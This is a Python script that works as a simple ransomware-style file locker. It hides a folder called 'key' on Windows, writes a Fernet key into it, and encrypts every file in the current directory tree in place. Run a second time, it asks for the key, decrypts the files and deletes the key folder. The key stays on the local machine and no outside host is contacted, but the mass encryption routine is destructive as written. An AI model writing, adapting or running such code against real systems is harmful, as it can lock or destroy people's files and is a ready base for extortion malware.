import os
# import required module
import ctypes
from cryptography.fernet import Fernet

def check_prep(path):
    if not os.path.exists(path):
        os.makedirs(path)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ret = ctypes.windll.kernel32.SetFileAttributesW(path, FILE_ATTRIBUTE_HIDDEN)


check_prep("key")

if not os.path.exists('key/filekey.key'):
    # key generation
    key = Fernet.generate_key()

    # string the key in a file
    with open('key/filekey.key', 'wb') as filekey:
        filekey.write(key)

    # opening the key
    with open('key/filekey.key', 'rb') as filekey:
        key = filekey.read()

    # using the generated key
    fernet = Fernet(key)
    path = "."

    skipfiles = ['encrypt.py', 'decrypt.py']

    for root, d_names, f_names in os.walk(path):
        if (root == ".\key"):
            continue
        if (len(f_names)):
            for file in f_names:
                if (file in skipfiles):
                    continue
                filename = root + '\\' + file
                
                with open(filename, 'rb') as file:
                    original = file.read()
                encrypted = fernet.encrypt(original)
                with open(filename, 'wb') as encrypted_file:
                    encrypted_file.write(encrypted)
else:
    path = "."
    with open('key/filekey.key', 'rb') as filekey:
        key = filekey.read()

    fernet = Fernet(key)

    skipfiles = ['encrypt.py', 'decrypt.py']

    inputKey = input("Enter key: ")
    if inputKey == key.decode('utf-8'):
        for root, d_names, f_names in os.walk(path):
            if (root == ".\key"):
                continue
            if (len(f_names)):
                for file in f_names:
                    if (file in skipfiles):
                        continue
                    filename = root + '\\' + file
                    with open(filename, 'rb') as enc_file:
                        encrypted = enc_file.read()

                    decrypted = fernet.decrypt(encrypted)

                    with open(filename, 'wb') as dec_file:
                        dec_file.write(decrypted)
        for root, dirs, files in os.walk("key/", topdown=False):
            for name in files:
                os.remove(root + name)

        os.rmdir('key')
